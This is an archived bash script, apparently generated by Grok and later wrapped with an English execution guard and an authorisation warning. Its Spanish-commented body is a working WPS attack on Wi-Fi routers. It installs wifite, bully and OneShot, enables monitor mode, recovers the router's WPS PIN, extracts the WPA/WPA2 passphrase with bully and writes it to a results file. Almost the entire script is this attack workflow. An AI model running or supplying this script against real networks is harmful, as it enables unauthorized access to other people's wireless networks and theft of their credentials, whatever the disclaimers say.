#!/bin/bash

# Historical experimental source. The original header attributes generation to Grok.
# The original license is undocumented; the repository MIT grant does not cover it.
# Publication changes: an execution guard, private-file defaults and one removed private example.

case "${1:-}" in
    --help|-h)
        printf '%s\n' \
            'Historical wireless audit source; execution is disabled by default.' \
            'Read historical/wireless/README.md for provenance, license status and effects.' \
            'The original workflow installs software, changes network interfaces and can write wireless credentials.' \
            'Only for networks you own or have explicit permission to assess.' \
            'An explicit --enable-experimental-wireless-audit flag opts into the original workflow.' \
            'No hardware or active wireless execution was validated for this archive.'
        exit 0
        ;;
    --enable-experimental-wireless-audit)
        shift
        if [ "$#" -ne 0 ]; then
            printf '%s\n' 'Unexpected arguments. Read --help before using this experimental archive.' >&2
            exit 2
        fi
        ;;
    *)
        printf '%s\n' \
            'Archived experimental source: execution is disabled by default.' \
            'Use --help to read the scope and explicit opt-in requirement.' >&2
        exit 2
        ;;
esac

# Restrict permissions on newly created logs and result files.
umask 077


# Script para obtener el PIN WPS y la contraseña WPA/WPA2 con Wifite o OneShot y Bully
# Autor: Grok (generado para usuario en Kali Linux)
# Uso: sudo ./wps_attack.sh
# Nota: Este script es para uso ético en tus propias redes Wi-Fi.
#       No lo uses en redes sin permiso explícito, es ilegal.

# Colores para mensajes
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[1;33m'
NC='\033[0m' # Sin color

# Función para mostrar mensajes
function mensaje {
    echo -e "${VERDE}[+] $1${NC}"
}

function error {
    echo -e "${ROJO}[!] Error: $1${NC}"
    exit 1
}

# Verificar si se ejecuta como root
if [ "$EUID" -ne 0 ]; then
    error "Ejecuta el script con sudo: sudo ./wps_attack.sh"
fi

# Paso 1: Verificar e instalar dependencias
mensaje "Verificando dependencias..."
for pkg in aircrack-ng wifite bully python3-pip build-essential unzip; do
    if ! dpkg -l | grep -q "$pkg"; then
        mensaje "Instalando $pkg..."
        apt install "$pkg" -y || error "No se pudo instalar $pkg"
    else
        mensaje "$pkg ya está instalado"
    fi
done

# Instalar OneShot si no está presente
if ! command -v oneshot &> /dev/null; then
    mensaje "Instalando OneShot..."
    # Verificar disponibilidad del repositorio con reintento
    REPO_URL="https://github.com/fulvius31/OneShot.git"
    ATTEMPTS=3
    for ((i=1; i<=ATTEMPTS; i++)); do
        if curl -s -I "$REPO_URL" | grep -q "200 OK"; then
            mensaje "Repositorio de OneShot disponible"
            git clone "$REPO_URL" /tmp/OneShot || error "No se pudo clonar el repositorio de OneShot"
            cd /tmp/OneShot || error "No se pudo acceder al directorio /tmp/OneShot"
            python3 setup.py install || error "No se pudo instalar OneShot"
            cd - > /dev/null
            break
        else
            mensaje "Intento $i/$ATTEMPTS: Repositorio no disponible, reintentando..."
            sleep 2
        fi
        if [ $i -eq $ATTEMPTS ]; then
            mensaje "No se pudo acceder al repositorio de OneShot. Continuando con Wifite..."
            ONESHOT_AVAILABLE=false
        fi
    done
else
    mensaje "OneShot ya está instalado"
    ONESHOT_AVAILABLE=true
fi

# Paso 2: Obtener la MAC de la interfaz wlan0
mensaje "Obteniendo la MAC de wlan0..."
MAC=$(ip link show wlan0 | grep link/ether | awk '{print $2}')
if [ -z "$MAC" ]; then
    error "No se pudo obtener la MAC de wlan0"
else
    mensaje "MAC encontrada: $MAC"
fi

# Paso 3: Activar modo monitor
mensaje "Activando modo monitor en wlan0..."
airmon-ng start wlan0 > /dev/null || error "No se pudo activar modo monitor"
if ip link show wlan0mon > /dev/null 2>&1; then
    mensaje "Interfaz wlan0mon creada"
else
    error "No se creó wlan0mon"
fi

# Paso 4: Escanear redes con Wifite para obtener PIN WPS
mensaje "Escaneando redes con Wifite (selecciona tu red)..."
wifite --wps --kill > wps_scan.log
# Mostrar redes encontradas
grep -E "WPS.*[0-9]+\.[0-9]+" wps_scan.log | awk '{print $1, $2, $3, $4, $5}' | column -t
echo -e "${AMARILLO}Ingresa el número de tu red (ejemplo: 1):${NC}"
read -r RED_NUMERO
# Extraer BSSID y canal de la red seleccionada
BSSID=$(grep -E "WPS.*[0-9]+\.[0-9]+" wps_scan.log | sed -n "${RED_NUMERO}p" | awk '{print $2}')
CANAL=$(grep -E "WPS.*[0-9]+\.[0-9]+" wps_scan.log | sed -n "${RED_NUMERO}p" | awk '{print $3}')
if [ -z "$BSSID" ] || [ -z "$CANAL" ]; then
    error "No se pudo obtener BSSID o canal. Verifica tu selección."
else
    mensaje "Red seleccionada - BSSID: $BSSID, Canal: $CANAL"
fi

# Intentar obtener PIN WPS con Wifite
mensaje "Buscando PIN WPS con Wifite..."
wifite --wps --kill -i wlan0mon --bssid "$BSSID" --chan "$CANAL" > wps_pin.log
PIN=$(grep "WPS PIN" wps_pin.log | awk '{print $NF}' | head -n 1)
if [ -z "$PIN" ] && [ "$ONESHOT_AVAILABLE" = true ]; then
    mensaje "Wifite no encontró el PIN. Intentando con OneShot..."
    oneshot -i wlan0mon -b "$BSSID" -c "$CANAL" -K > oneshot.log
    PIN=$(grep "WPS PIN" oneshot.log | awk '{print $NF}' | head -n 1)
    if [ -z "$PIN" ]; then
        error "No se encontró un PIN WPS. Verifica que WPS esté activo en el router."
    fi
elif [ -z "$PIN" ]; then
    error "No se encontró un PIN WPS con Wifite y OneShot no está disponible. Verifica que WPS esté activo."
fi
mensaje "PIN WPS encontrado: $PIN"

# Paso 5: Usar Bully para obtener la contraseña
mensaje "Ejecutando Bully con PIN $PIN..."
bully -b "$BSSID" -c "$CANAL" -B -p "$PIN" --source "$MAC" wlan0mon > bully_output.log
if grep -q "KEY" bully_output.log; then
    CLAVE=$(grep "KEY" bully_output.log | awk '{print $NF}' | head -n 1)
    ESSID=$(grep "ESSID" bully_output.log | awk '{print $NF}' | head -n 1)
    mensaje "¡Contraseña encontrada!"
    echo -e "${AMARILLO}ESSID: $ESSID"
    echo -e "BSSID: $BSSID"
    echo -e "PIN WPS: $PIN"
    echo -e "Contraseña WPA/WPA2: $CLAVE${NC}"
else
    error "No se pudo obtener la contraseña. Revisa bully_output.log para detalles."
fi

# Paso 6: Limpieza
mensaje "Restaurando interfaz..."
airmon-ng stop wlan0mon > /dev/null
service NetworkManager restart > /dev/null
mensaje "¡Proceso terminado! Archivos de log: wps_scan.log, wps_pin.log, oneshot.log, bully_output.log"

# Guardar resultados en un archivo
echo -e "Resultados del ataque WPS\n" > resultados_wps.txt
echo -e "ESSID: $ESSID" >> resultados_wps.txt
echo -e "BSSID: $BSSID" >> resultados_wps.txt
echo -e "PIN WPS: $PIN" >> resultados_wps.txt
echo -e "Contraseña WPA/WPA2: $CLAVE" >> resultados_wps.txt
mensaje "Resultados guardados en resultados_wps.txt"
